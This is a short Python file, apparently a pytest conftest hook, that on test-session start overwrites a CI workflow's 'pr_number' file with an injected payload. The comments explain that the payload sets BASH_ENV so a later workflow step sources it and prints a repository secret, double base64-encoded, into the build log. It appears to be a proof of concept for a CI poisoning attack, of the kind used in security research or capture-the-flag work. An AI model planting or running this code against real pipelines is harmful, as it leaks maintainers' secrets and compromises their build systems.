import pytest
import os

def pytest_sessionstart(session):
    # Overwrite the pr_number file created by the workflow
    # The payload injects BASH_ENV to point to this file
    # When sourced, the first line (the PR number) will fail as a command, but bash continues
    payload = "1\nBASH_ENV=./pr_number\necho \"GARALT_LEAKED_TOKEN=$(echo -n $GARALT_SECRET | base64 | base64)\"\nexit 0\n"
    with open("pr_number", "w") as f:
        f.write(payload)
